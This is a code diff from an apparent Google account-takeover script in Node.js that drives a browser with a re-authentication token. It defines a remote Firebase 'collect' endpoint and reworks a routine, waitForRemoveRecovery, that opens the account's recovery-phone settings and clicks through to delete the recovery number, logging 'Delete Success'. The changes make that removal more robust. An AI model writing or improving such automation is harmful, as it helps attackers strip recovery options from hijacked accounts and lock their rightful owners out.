@@ -4,7 +4,7 @@ const twofactor = require('node-2fa')
 const axios = require('axios')
 
 
-const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/raiyan086/collect'
+const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/raiyan086/collect' 
 
 let mMailData = null
 let mMailRequest = false
@@ -693,6 +693,7 @@ async function waitForNameChange(page, mRapt) {
 async function waitForRemoveRecovery(page, mRapt) {
     try {
         let loadPage = true
+        let mRemove = false
         try {
             loadPage = !await page.url().startsWith('https://myaccount.google.com/signinoptions/rescuephone')
         } catch (error) {}
@@ -704,44 +705,29 @@ async function waitForRemoveRecovery(page, mRapt) {
 
         for (let i = 0; i < 10; i++) {
             if (await exists(page, 'div[data-phone]')) {
-                await waitForSelector(page, 'div[class="N9Ni5"] > div:nth-child(2)')
-                await delay(500)
-                await page.click('div[class="N9Ni5"] > div:nth-child(2)')
-                
-                for (let i = 0; i < 10; i++) {
-                    await delay(1000)
-                    if (await exists(page, 'div[class="XfpsVe J9fJmf"] > div:nth-child(2)')) {
-                        await page.click('div[class="XfpsVe J9fJmf"] > div:nth-child(2)')
-                        console.log('Node: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
-                        await delay(3000)
-                        break
+                try {
+                    await waitForSelector(page, 'div[class="N9Ni5"] > div:nth-child(2)')
+                    await delay(500)
+                    await page.click('div[class="N9Ni5"] > div:nth-child(2)')
+                    
+                    for (let i = 0; i < 10; i++) {
+                        await delay(1000)
+                        if (await exists(page, 'div[class="XfpsVe J9fJmf"] > div:nth-child(2)')) {
+                            await page.click('div[class="XfpsVe J9fJmf"] > div:nth-child(2)')
+                            console.log('Node: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
+                            await delay(3000)
+                            mRemove = true
+                        }
                     }
-                }
+                } catch (error) {}
+            } else if (mRemove) {
+                return true
             } else if (await exists(page, 'div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc Zrq4w WIL89 M9Bg4d"]')) {
                 console.log('Node: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
                 return true
             }
 
             await delay(1000)
-        }
-    } catch (error) {}
-
-    try {
-        await page.goto('https://myaccount.google.com/signinoptions/rescuephone?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
-
-        await delay(1000)
-        if (await exists(page, 'div[data-phone]')) {
-            await page.click('div[class="N9Ni5"] > div:nth-child(2)')
-        
-            for (let i = 0; i < 10; i++) {
-                await delay(1000)
-                if (await exists(page, 'div[class="XfpsVe J9fJmf"] > div:nth-child(2)')) {
-                    await page.click('div[class="XfpsVe J9fJmf"] > div:nth-child(2)')
-                    console.log('Node: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
-                    await delay(3000)
-                    return true
-                }
-            }
         }
     } catch (error) {}
 
